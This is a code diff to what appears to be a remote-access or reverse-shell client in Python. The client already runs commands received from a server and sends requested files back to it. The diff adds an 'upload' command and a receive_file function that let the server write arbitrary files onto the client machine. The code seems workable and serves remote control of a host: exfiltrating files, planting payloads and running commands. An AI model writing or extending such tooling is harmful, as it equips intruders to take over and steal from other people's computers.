@@ -100,6 +100,28 @@ def send_file(s, filename):
         log_message(f"Error sending file: {str(e)}", "ERROR")
         return False
 
+# Receive file from server (for upload command)
+def receive_file(s, filename):
+    try:
+        file_size = int.from_bytes(s.recv(8), 'big')
+        log_message(f"Receiving {filename} ({file_size} bytes)...")
+        
+        bytes_received = 0
+        with open(filename, 'wb') as f:
+            while bytes_received < file_size:
+                chunk = s.recv(min(4096, file_size - bytes_received))
+                if not chunk:
+                    break
+                f.write(chunk)
+                bytes_received += len(chunk)
+        
+        log_message(f"File received: {filename}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Error receiving file: {str(e)}", "ERROR")
+        return False
+
 # Execute commands received from server
 def execute_commands(s):
     try:
@@ -128,6 +150,12 @@ def execute_commands(s):
                     filename = cmd[9:].strip()
                     log_message(f"Download requested: {filename}")
                     send_file(s, filename)
+                    continue
+                
+                if cmd.startswith("upload "):
+                    filename = cmd[7:].strip()
+                    log_message(f"Upload incoming: {filename}")
+                    receive_file(s, filename)
                     continue
                 
                 if data[:2].decode("utf-8") == 'cd':
